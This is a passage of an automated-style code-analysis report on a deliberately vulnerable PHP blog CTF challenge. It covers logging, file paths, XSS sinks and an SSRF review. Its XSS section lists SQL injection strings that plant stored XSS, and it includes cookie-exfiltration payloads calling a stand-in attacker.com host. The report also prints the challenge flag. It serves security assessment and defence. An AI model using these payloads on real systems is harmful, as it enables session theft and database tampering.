**Monitoring & Logging:** The application has minimal logging capabilities. Apache logs are configured to write to `/var/log/apache2/error2.log` (errors) and `/var/log/apache2/access2.log` (access logs) per `000-default.conf:14-15`. These logs are stored within the Docker container and would be lost if the container is destroyed (no Docker volume mapping for logs in `docker-compose.yml`). PHP errors are logged to `/dev/stderr` per `Dockerfile:13`, which streams to Docker logs accessible via `docker logs <container>`. However, there is no structured logging, no log aggregation (no Elasticsearch, Splunk, or CloudWatch integration), no security event logging (no record of SQL injection attempts, authentication failures, or suspicious activity), no alerting thresholds, and no log retention policy. Modern applications should implement centralized logging with security information and event management (SIEM) integration, real-time alerting on suspicious patterns, and audit trails for all data access and privilege changes.

---

## 7. Overall Codebase Indexing

The XBEN-083-24 codebase follows a minimal directory structure typical of legacy PHP applications and CTF challenges. The repository root (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/`) contains six items: an `app/` directory with all application code, `benchmark.json` CTF metadata file, `docker-compose.yml` orchestration configuration, `.env` file with flag value, `Makefile` with build automation commands, and `.git/` version control directory. The `app/` subdirectory contains Apache configuration (`000-default.conf`), database initialization script (`db_init.sql`), Dockerfile for web service image build, container entrypoint script (`entrypoint.sh`), and an `html/` subdirectory serving as the web root.

The `html/` directory contains the complete application: a single PHP file (`index.php`, 71 lines) implementing all business logic, a CSS stylesheet (`styles.css`, 28 lines) for visual presentation, and an `images/` subdirectory with two JPEG files (morning-dew.jpg at 273KB, sunset.jpg at 226KB). This flat structure with no subdirectories, no MVC separation, no routing layer, and no framework conventions is characteristic of early 2000s PHP development patterns. The entire application logic exists in one file, mixing database access, HTML rendering, and business logic without separation of concerns.

Build orchestration is managed through Docker Compose and a Makefile. The Makefile (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/Makefile`) defines targets for building the Docker image with flag injection (`build` target passes `--build-arg FLAG=$$FLAG`), starting the application (`up` target runs `docker-compose up`), and stopping it (`down` target). The `docker-compose.yml` orchestrates two services: `web` (PHP-Apache container) and `db` (MySQL container) with a health check mechanism for the web service. The database is initialized via volume-mounted SQL script (`db_init.sql`) that creates tables and seeds initial data including the hidden flag post.

Code generation tools are not present - there are no code generators, no scaffolding tools, no ORM model generators, and no build-time code transformation. Testing frameworks are completely absent - there are no PHPUnit tests, no integration tests, no test fixtures, and no test automation configuration. This reflects the CTF challenge nature of the application where testing infrastructure is unnecessary for a deliberately vulnerable proof-of-concept.

The organization severely impacts security component discoverability. All security-relevant code (or lack thereof) exists in one 71-line file, making comprehensive review trivial but also highlighting the complete absence of security controls. There is no dedicated security module, no authentication directory, no authorization middleware, no input validation library, and no security configuration directory. Any security implementation would require creating these structures from scratch. The flat structure does make vulnerability discovery straightforward for penetration testers - there are no hidden routes, no complex routing configurations, and no framework magic to understand. Every entry point, every SQL query, and every output statement is visible in the single `index.php` file.

---

## 8. Critical File Paths

All security-relevant file paths referenced throughout this analysis, categorized for rapid manual review:

**Configuration:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/docker-compose.yml` - Service orchestration, port mappings, environment variables, database credentials
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/000-default.conf` - Apache VirtualHost configuration, missing security headers
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/Dockerfile` - Container build instructions, PHP error configuration, flag injection mechanism
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/.env` - Plaintext flag storage
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/entrypoint.sh` - Container initialization script
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/Makefile` - Build automation with flag injection

**Authentication & Authorization:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php` (lines 41-42) - Weak "Hidden" category filter (authorization bypass)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/db_init.sql` (lines 26-30, 56) - Admin table schema and MD5 password hashing
- **NOTE:** No session management files, no authentication endpoints, no JWT handlers, no OAuth callbacks exist

**API & Routing:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php` (entire file) - Single application entry point, all route handling
- **NOTE:** No API schema files (OpenAPI/Swagger, GraphQL) found in codebase

**Data Models & DB Interaction:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/db_init.sql` - Database schema, initial data seeding, flag storage location
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php` (line 2) - Database connection with hardcoded credentials
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php` (lines 39-49) - SQL query construction, SQL injection vulnerability
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php` (lines 24-30) - Dropdown category query

**Dependency Manifests:**
- **NONE** - No composer.json, package.json, requirements.txt, or other dependency files exist
- Dependencies managed solely through Docker base images (php:7.4-apache, mysql:5.7)

**Sensitive Data & Secrets Handling:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/.env` (line 1) - Plaintext CTF flag
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php` (line 2) - Hardcoded database credentials
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/docker-compose.yml` (lines 13-15, 26-29) - Database passwords in environment variables
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/db_init.sql` (line 53) - Flag template location in database seed
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/Dockerfile` (lines 20-21) - Flag substitution mechanism via sed

**Middleware & Input Validation:**
- **NONE** - No middleware files, no input validation libraries, no sanitization functions exist
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php` (line 37) - Direct GET parameter capture with zero validation
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php` (line 45) - Unsafe SQL concatenation (SQL injection sink)

**Logging & Monitoring:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/000-default.conf` (lines 14-15) - Apache log file paths
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/Dockerfile` (lines 9-13) - PHP error logging configuration
- **NOTE:** No security event logging, no audit trails, no monitoring agents configured

**Infrastructure & Deployment:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/docker-compose.yml` - Complete deployment configuration
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/Dockerfile` - Web service container build
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/000-default.conf` - Apache VirtualHost configuration (HTTP only, missing security headers)
- **NOTE:** No Kubernetes manifests, no Nginx configuration, no gateway/ingress configurations, no TLS certificates

**CTF Flag Storage:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/.env` (line 1) - Flag definition: `FLAG="flag{7b228415-018a-4446-ad84-66153396e7c6}"`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/db_init.sql` (line 53) - Flag in database seed: `('PRIVATE POST', 'Hidden', '<FLAG>@FLAG@</FLAG>', '',0);`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/Dockerfile` (lines 20-21) - Flag injection: `ARG FLAG` and `RUN sed -i s/@FLAG@/$FLAG/g /app/db_init.sql`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/docker-compose.yml` (line 6) - Flag build argument: `- FLAG`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/benchmark.json` (lines 6-8) - CTF metadata: `"name": "XBEN-083-24"`, `"win_condition": "flag"`

**Static Resources (Low Security Relevance):**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/styles.css` - CSS stylesheet
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/images/morning-dew.jpg` - Static image asset
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/images/sunset.jpg` - Static image asset

---

## 9. XSS Sinks and Render Contexts

This section catalogs all Cross-Site Scripting (XSS) vulnerabilities identified in network-accessible components of the application. Each vulnerability is documented with exact file location, line numbers, sink type, render context, and exploitation methodology.

### XSS Vulnerability #1: HTML Body Context - Blog Post Rendering

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php`  
**Lines:** 57-62  
**Sink Type:** Stored/Reflected XSS - HTML Body Context  
**Exploitation Difficulty:** Easy  
**Network Surface:** Primary web endpoint (GET /index.php)

**Vulnerable Code:**
```php
while($row = $result->fetch_assoc()) {
    echo "<div class='post'>
            <h2>{$row['title']}</h2>
            <p>Category: {$row['category']}</p>
            <img src='images/{$row['image']}' alt='{$row['title']}' style='width:200px;height:200px;'/>
            <p>" . substr($row['content'], 0, 200) . "...</p>
        </div>";
}
```

**User Input Source:** Database fields (`$row['title']`, `$row['category']`, `$row['content']`). These values originate from database queries but can be attacker-controlled via SQL injection vulnerability on line 45.

**Render Context:** HTML body - multiple injection points within `<h2>`, `<p>`, and `<img>` tags. The values are directly interpolated into HTML output without any encoding or sanitization.

**Attack Chain:**
1. Exploit SQL injection vulnerability (line 45) to insert malicious post with XSS payload
2. Example injection: `?category=' OR 1=1; INSERT INTO posts (title, category, content, image, published) VALUES ('<script>alert(document.cookie)</script>', 'Test', 'XSS Test', 'test.jpg', 1); --`
3. Payload persists in database (Stored XSS)
4. When any user views the blog index, the malicious script executes in their browser

**Example Payloads by Field:**
- **title field:** `<script>alert(1)</script>` - Executes JavaScript in `<h2>` tag
- **title field:** `<img src=x onerror=alert(document.cookie)>` - Event handler XSS
- **category field:** `<iframe src=javascript:alert(1)>` - Iframe-based XSS
- **content field:** `<svg onload=alert('XSS')>` - SVG-based XSS
- **content field:** `<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">` - Cookie exfiltration

**Impact:** Session hijacking (if sessions were implemented), credential theft, keylogging, phishing overlays, malware distribution, website defacement, cryptocurrency mining.

### XSS Vulnerability #2: HTML Attribute Context - Image Attributes

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php`  
**Line:** 60  
**Sink Type:** Stored XSS - HTML Attribute Context  
**Exploitation Difficulty:** Easy  
**Network Surface:** Primary web endpoint (GET /index.php)

**Vulnerable Code:**
```php
<img src='images/{$row['image']}' alt='{$row['title']}' style='width:200px;height:200px;'/>
```

**User Input Source:** Database fields `$row['image']` (in src attribute) and `$row['title']` (in alt attribute). Values can be attacker-controlled via SQL injection.

**Render Context:** HTML `src` and `alt` attributes enclosed in single quotes. Attributes can be escaped by including single quote in payload, followed by event handlers or additional attributes.

**Attack Chain:**
1. Use SQL injection to insert/update post with malicious image or title value
2. Example: `?category=' OR 1=1; UPDATE posts SET title='x\' onerror=\'alert(document.cookie)' WHERE id=1; --`
3. Malicious attribute value persists in database
4. When page renders, attribute escapes quotes and injects event handler

**Example Payloads:**
- **image field:** `x' onerror='alert(1)` - Breaks src attribute, adds onerror handler
- **title field:** `x' onmouseover='alert(document.cookie)` - Breaks alt attribute, adds mouse event
- **image field:** `x' autofocus onfocus='fetch("https://attacker.com?c="+document.cookie)'` - Auto-trigger exfiltration
- **title field:** `x' accesskey='X' onclick='alert(1)` - Keyboard-triggered XSS (user presses Alt+Shift+X)

**Impact:** Similar to HTML body XSS - session hijacking, credential theft, and full client-side compromise.

### XSS Vulnerability #3: HTML Option Context - Category Dropdown

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php`  
**Lines:** 26-30  
**Sink Type:** Stored/Reflected XSS - HTML Option Value and Text  
**Exploitation Difficulty:** Easy  
**Network Surface:** Primary web endpoint (GET /index.php)

**Vulnerable Code:**
```php
$cat_result = $conn->query("SELECT DISTINCT category FROM posts");
while ($row = $cat_result->fetch_assoc()) {
    $selected = ($row['category'] == $category) ? 'selected' : '';
    echo "<option value='{$row['category']}' {$selected}>{$row['category']}</option>";
}
```

**User Input Source:** Database field `$row['category']` (from posts table) and GET parameter `$category` (used for selected attribute logic). Both can be attacker-controlled.

**Render Context:** Two contexts - HTML option value attribute (single-quoted) and HTML option text content (between `<option>` tags).

**Attack Chain:**
1. Exploit SQL injection to insert post with malicious category name
2. Example: `?category=' OR 1=1; INSERT INTO posts (title, category, content, image, published) VALUES ('Test', '"><script>alert(1)</script><option value="', 'Test', 'test.jpg', 1); --`
3. Malicious category persists in database
4. Dropdown renders with injected script or breaks out of option tag structure

**Example Payloads:**
- **category field:** `'><script>alert(1)</script><option value='` - Breaks out of option, injects script
- **category field:** `' onmouseover='alert(1)` - Adds event handler to option value attribute
- **category field:** `</option><img src=x onerror=alert(1)><option>` - Closes option, injects image

**Impact:** Less severe than previous XSS vectors due to limited user interaction with dropdown, but still enables script execution and potential phishing attacks via manipulated dropdown options.

### XSS Vulnerability #4: Reflected XSS via GET Parameter (Limited)

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php`  
**Line:** 29  
**Sink Type:** Reflected XSS - HTML Attribute Context  
**Exploitation Difficulty:** Medium (requires social engineering)  
**Network Surface:** Primary web endpoint (GET /index.php?category=...)

**Vulnerable Code:**
```php
$selected = ($row['category'] == $category) ? 'selected' : '';
```

**User Input Source:** GET parameter `$category` (line 37: `$category = isset($_GET['category']) ? $_GET['category'] : '';`)

**Render Context:** HTML attribute `selected` within `<option>` tag. The comparison happens in PHP, and if true, the string "selected" is added as an attribute.

**Attack Chain:**
1. Craft malicious URL with category parameter matching a database category
2. Example: `http://target.com/?category=Technology` (if "Technology" exists in database)
3. The `selected` attribute is added: `<option value='Technology' selected>Technology</option>`
4. Limited XSS vector - the `$category` parameter itself is not directly echoed into HTML in this code block, reducing exploitation potential

**Note:** This is a lower-risk XSS vector because the `$category` value must match an existing database category to trigger the `selected` attribute insertion. The parameter is not directly output in this specific code section. However, the same `$category` parameter is vulnerable to SQL injection on line 45, which is a more critical vulnerability.

**Impact:** Minimal compared to other XSS vulnerabilities due to limited injection context.

### No Command Injection Sinks Found

**Finding:** No command injection vulnerabilities exist in network-accessible components. The application does not use `exec()`, `system()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()`, backtick operators, or any shell command execution functions in the PHP code.

**Files Analyzed:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php` - No command execution functions
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/entrypoint.sh` - Shell script but not network-accessible (container initialization only)

### No Template Injection Sinks Found

**Finding:** No template injection vulnerabilities exist. The application does not use template engines like Twig, Smarty, Blade, or any server-side template rendering systems. All HTML is generated via raw PHP `echo` statements with direct string concatenation.

**Analysis:** While the lack of a template engine eliminates template injection risks, it also removes automatic escaping protections that modern template engines provide by default. The manual HTML generation without encoding functions creates the XSS vulnerabilities documented above.

### XSS Exploitation Summary

| Vulnerability | Location | Sink Type | Difficulty | Impact |
|---------------|----------|-----------|------------|--------|
| Blog Post HTML Body XSS | index.php:57-62 | Stored XSS | Easy | Critical - Persistent code execution affecting all users |
| Image Attribute XSS | index.php:60 | Stored XSS | Easy | Critical - Session hijacking via event handlers |
| Dropdown Option XSS | index.php:26-30 | Stored XSS | Easy | High - Limited interaction but persistent |
| Reflected XSS (GET param) | index.php:29 | Reflected XSS | Medium | Low - Limited context, requires social engineering |

**Primary Exploitation Path:** All stored XSS vulnerabilities require SQL injection as a prerequisite attack. An external attacker would: (1) Identify SQL injection vulnerability in category parameter, (2) Craft SQL injection payload that inserts malicious post with XSS in title/content/category fields, (3) Wait for victim users to view the blog index, (4) Malicious JavaScript executes in victim browsers with full DOM access and session privileges.

**Defense Recommendations:** Implement output encoding on all database values before rendering in HTML. Use `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` for HTML body context and `htmlspecialchars($value, ENT_QUOTES, 'UTF-8')` for HTML attribute context. Modern PHP template engines like Twig provide automatic escaping by default. Additionally, implement Content-Security-Policy headers to restrict inline script execution and limit XSS impact even if injection occurs.

---

## 10. SSRF Sinks

**FINDING:** No SSRF (Server-Side Request Forgery) vulnerabilities exist in network-accessible components of this application.

### Comprehensive SSRF Analysis

Server-Side Request Forgery occurs when an application makes outbound HTTP/network requests with user-controllable URLs or destinations. After exhaustive analysis of the XBEN-083-24 codebase, no code patterns matching SSRF vulnerability signatures were identified.

### SSRF Sink Categories Analyzed (All Negative)

**HTTP(S) Client Functions:**
- **Searched for:** `curl_init`, `curl_exec`, `curl_setopt`, `file_get_contents`, `fopen`, `readfile`, `file()` with URL wrappers, Guzzle HTTP client, PHP HTTP client libraries
- **Result:** NOT FOUND in network-accessible code
- **Files Analyzed:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php`

**Raw Socket & Network APIs:**
- **Searched for:** `fsockopen`, `pfsockopen`, `socket_create`, `socket_connect`, `stream_socket_client`, `stream_context_create` with network streams
- **Result:** NOT FOUND
- **Analysis:** No low-level socket operations present in PHP code

**File Inclusion with User Input:**
- **Searched for:** `include`, `require`, `include_once`, `require_once` with user-controlled paths, `allow_url_include` exploitation
- **Result:** NOT FOUND
- **Analysis:** No dynamic file inclusion in the application. The only include-style operation is the database initialization script (`db_init.sql`) volume-mounted in Docker, not influenced by user input

**URL Wrappers:**
- **Searched for:** `http://`, `https://`, `ftp://`, `gopher://`, `dict://`, `php://`, `data://`, `expect://`, `ssh2://` in user-controlled strings
- **Result:** NOT FOUND
- **Analysis:** The application does not accept or process URLs from user input. The only user input (`$_GET['category']`) is a string used for database filtering

**Redirect & Location Handlers:**
- **Searched for:** `header('Location:')` with user input, `http_redirect()`, framework redirect methods
- **Result:** NOT FOUND
- **Analysis:** No HTTP redirect functionality exists in the application. No `header()` function calls at all

**XML External Entity (XXE) Leading to SSRF:**
- **Searched for:** `simplexml_load_file`, `simplexml_load_string`, `DOMDocument::load`, `DOMDocument::loadXML`, `XMLReader::open` with user input
- **Result:** NOT FOUND
- **Analysis:** No XML processing functionality in the application

**Image Processing with URLs:**
- **Searched for:** `imagecreatefromjpeg`, `imagecreatefrompng`, `getimagesize`, ImageMagick/GD functions with user-controlled URLs
- **Result:** NOT FOUND
- **Analysis:** Images are served statically by Apache. The `image` field in database contains filenames only ('morning-dew.jpg'), not URLs. No dynamic image processing occurs

**DNS Lookup Functions:**
- **Searched for:** `dns_get_record`, `gethostbyname`, `gethostbynamel`, `checkdnsrr`
- **Result:** NOT FOUND
- **Analysis:** No DNS resolution functions present

**SOAP/Web Service Clients:**
- **Searched for:** `SoapClient`, `__doRequest`, `__soapCall`
- **Result:** NOT FOUND
- **Analysis:** No SOAP or web service integration

**Webhook Handlers & Callbacks:**
- **Searched for:** Webhook receivers, callback endpoints, "ping URL" functionality, "test webhook" features
- **Result:** NOT FOUND
- **Analysis:** Application has no outbound notification or callback mechanisms

**SSO/OAuth URL Fetching:**
- **Searched for:** OpenID Connect discovery (`/.well-known/openid-configuration`), JWKS URL fetching, OAuth metadata endpoints
- **Result:** NOT FOUND
- **Analysis:** No SSO or OAuth implementation (see Section 3)

**Link Previewers & Unfurlers:**
- **Searched for:** oEmbed clients, Open Graph metadata fetchers, URL preview generators
- **Result:** NOT FOUND
- **Analysis:** No link preview or unfurling functionality

**Import from URL Features:**
- **Searched for:** "Import from URL", RSS/Atom feed readers, CSV/JSON importers with URL sources
- **Result:** NOT FOUND
- **Analysis:** No data import functionality

### Application Architecture Context

The XBEN-083-24 application is a traditional server-rendered PHP blog with no modern API integration patterns. Its network behavior consists solely of:

1. **Inbound:** Receiving HTTP requests on port 80 (Apache)
2. **Internal:** MySQL database queries over Docker network (db:3306)
3. **Outbound:** NONE - No external network requests

**Network Topology:**
```
Internet → [Port 80] → Apache/PHP Container → [Docker Network] → MySQL Container
                                              ↓
                                           (No outbound connections)
```

The MySQL database is internal to the Docker network and not exposed to external networks (`docker-compose.yml` defines no `ports:` mapping for the db service). The web container makes no external network requests to the internet, cloud services, APIs, or any external hosts.

### User Input Analysis

The application accepts one user-controlled parameter: `$_GET['category']` (line 37). This parameter is used exclusively for SQL query construction:

```php
$category = isset($_GET['category']) ? $_GET['category'] : '';
// ... validation logic ...
if (!empty($category)) {
    $sql .= "and category = '" . $category . "' ";  // SQL injection sink
}
```

**SSRF Risk Assessment:** The `category` parameter is NEVER used in:
- URL construction
- File path operations with URL wrappers
- HTTP client requests
- DNS lookups
- Network socket operations
- Redirect headers
- Any outbound network operations

**Vulnerability Type:** This parameter is vulnerable to **SQL injection** (see Section 8, Critical Vulnerability #1), not SSRF.

### Static File Serving

The application serves static images (`morning-dew.jpg`, `sunset.jpg`) from `/var/www/html/images/`. These are served directly by Apache without PHP processing. The image paths are hardcoded in the database:

```sql
-- From db_init.sql lines 33-52
INSERT INTO posts VALUES (1, 'Title', 'Nature', 'content...', 'morning-dew.jpg', 1, NOW());
```

The `image` field contains filenames only, not URLs. Apache serves these files via standard filesystem access, not via outbound HTTP requests. There is no user-controllable image URL parameter, no image upload with URL source, and no dynamic image fetching.

### PHP Configuration Review

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/Dockerfile:9-13`

The PHP configuration enables error display and logging but does not enable dangerous stream wrappers:

```dockerfile
RUN echo 'display_errors = On' >> /usr/local/etc/php/conf.d/errors.ini \
    && echo 'display_startup_errors = On' >> /usr/local/etc/php/conf.d/errors.ini \
    && echo 'error_reporting = E_ALL' >> /usr/local/etc/php/conf.d/errors.ini \
    && echo 'log_errors = On' >> /usr/local/etc/php/conf.d/errors.ini \
    && echo 'error_log = /dev/stderr' >> /usr/local/etc/php/conf.d/errors.ini
```

**SSRF-Relevant Configuration Check:**
- `allow_url_fopen`: Not explicitly configured (defaults to enabled in PHP 7.4)
- `allow_url_include`: Not explicitly configured (defaults to disabled in PHP 7.4)
- Neither configuration matters because the application never uses `fopen`, `file_get_contents`, or `include/require` with user input

### Conclusion: No SSRF Attack Surface

**Definitive Finding:** The XBEN-083-24 application has **ZERO SSRF attack surface**. The application architecture does not include any functionality that makes outbound network requests. User input is limited to a database filtering parameter with SQL injection vulnerability, not URL/network manipulation vulnerability.

**Primary Vulnerabilities Present:**
1. **SQL Injection** (Critical) - `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php:45`
2. **Stored/Reflected XSS** (Critical) - `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/html/index.php:57-62`
3. **Weak Cryptography** (Critical) - `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/db_init.sql:56`
4. **Hardcoded Credentials** (High) - Multiple locations
5. **Missing Security Headers** (High) - `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-083-24/app/000-default.conf`

**SSRF Status:** Not applicable to this application's architecture. Penetration testing efforts should focus on SQL injection as the primary attack vector for achieving the CTF objective (flag extraction).

---

**End of Code Analysis Deliverable**

## Authenticated Scans

### SCHEMATHESIS
Status: skipped
No API schemas found

---
Report generated at: 2025-10-28T20:50:11.061Z